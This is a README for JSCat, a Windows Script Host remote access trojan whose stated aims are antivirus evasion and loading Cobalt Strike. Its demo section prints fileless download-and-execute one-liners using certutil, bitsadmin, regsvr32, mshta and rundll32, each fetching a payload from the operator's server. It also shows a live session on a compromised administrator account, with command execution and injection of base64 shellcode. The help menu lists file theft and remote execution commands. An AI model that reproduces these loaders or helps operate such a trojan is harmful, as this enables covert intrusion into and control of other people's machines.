# JSCat
```bash
      _    ___     ___             _
   _ | |  / __|   / __|   __ _    | |_
  | || |  \__ \  | (__   / _` |   |  _|
  _\__/   |___/   \___|  \__,_|   _\__|
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
```

基于Windows Script Host的简单RAT！想法来源于Koadic和JSRat-Py，并不是要做一款功能全面的强大的远控，最终目标是轻量、流量加密、免杀和CS加载器。



### Features

- 反弹上线/自动上线/无文件落地
- 流量加密
- 命令执行
- 上传/下载
- shellcode注入

### Install

```
# git clone https://github.com/hanc00l/jscat
# cd jscat
# pip3 install -r requirements.txt
```

### Demo

```
➜  python3 jscat.py -h

usage: jscat.py [-h] --host HOST [-p PORT] [--new_key] [-s SLEEP_TIME]

optional arguments:
  -h, --help            show this help message and exit
  --host HOST           host foreign ip for host connect
  -p PORT, --port PORT  host listening port,default is 6600
  --new_key             generate new rc4 key to encrypt data
  -s SLEEP_TIME, --sleep_time SLEEP_TIME
                        set agent sleep time in second,default is 5
                        
➜  python jscat.py --host 172.16.80.1

[*]server cipher key: FnxYtigYdCcyrXph
[*]server running in  0.0.0.0:6600...
[*]host connect ip is 172.16.80.1:6600...
[*]Execute in client:
certutil -urlcache -split -f http://172.16.80.1:6600/init css.js && cscript //nologo css.js
bitsadmin /transfer n http://172.16.80.1:6600/init css.js && cscript //nologo css.js
regsvr32 /s /n /u /i:http://172.16.80.1:6600/file.sct scrobj.dll
mshta javascript:eval("x=new ActiveXObject('WinHttp.WinHttpRequest.5.1');x.open('GET','http://172.16.80.1:6600/init',false);x.send();eval(x.responseText)")(window.close())
rundll32 javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://172.16.80.1:6600/init",false);x.send();eval(x.responseText);window.close();

[+]received SESSION INIT, client:172.16.80.162,bytes 276
USER:WIN-KHI6PNROT09\Administrator*
HOST:WIN-KHI6PNROT09
OS:Windows Server 2008 R2 Standard***7601
DC:Unknown
ARCH:AMD64
CWD:C:\test
IP:172.16.80.162

>s -i 1
172.16.80.162(SID:1) >whoami
[+]received client:172.16.80.162,SID/JOB:1/2, bytes 536

用户信息
----------------

用户名                        SID
============================= ============================================
win-khi6pnrot09\administrator S-1-5-21-740217473-3054057987-2729292843-500


172.16.80.162(SID:1) >shell net user
[+]received client:172.16.80.162,SID/JOB:1/3, bytes 428

\\WIN-KHI6PNROT09 的用户帐户

-------------------------------------------------------------------------------
Administrator            Guest                    hancool
命令成功完成。

172.16.80.162(SID:1) >inject /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HX
xTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYwA= 3292
[+]received client:172.16.80.162,SID/JOB:1/4, bytes 60
[Inject shellcode success]

172.16.80.162(SID:1) >help
Usage:
	info: get system info
	sleep [seconds]: set sleep time
	shell [cmd]: execute shell command
	run [cmd]: run program and return
	cat [path_file]: show remote file context
	upload [local_file] [remote_file]: upload file
	download [local_file] [remote_file]: download file
	js run [local_pathname]: run jscript file in remote host
	inject [base64_shellcode | -f shellcode_raw_file] [pid]: inject shellcode  by DotNetToJS
		(shellcode is bas64encoded or raw file)
	jobs: show session jobs
	alias: show shell alias name
	back: exit current session
```



### TODO

- [ ]  JScript代码混淆
- [ ] 免杀



### 参考

- [Koadic](https://github.com/zerosum0x0/koadic)
- [JSRat-Py](https://github.com/Hood3dRob1n/JSRat-Py)

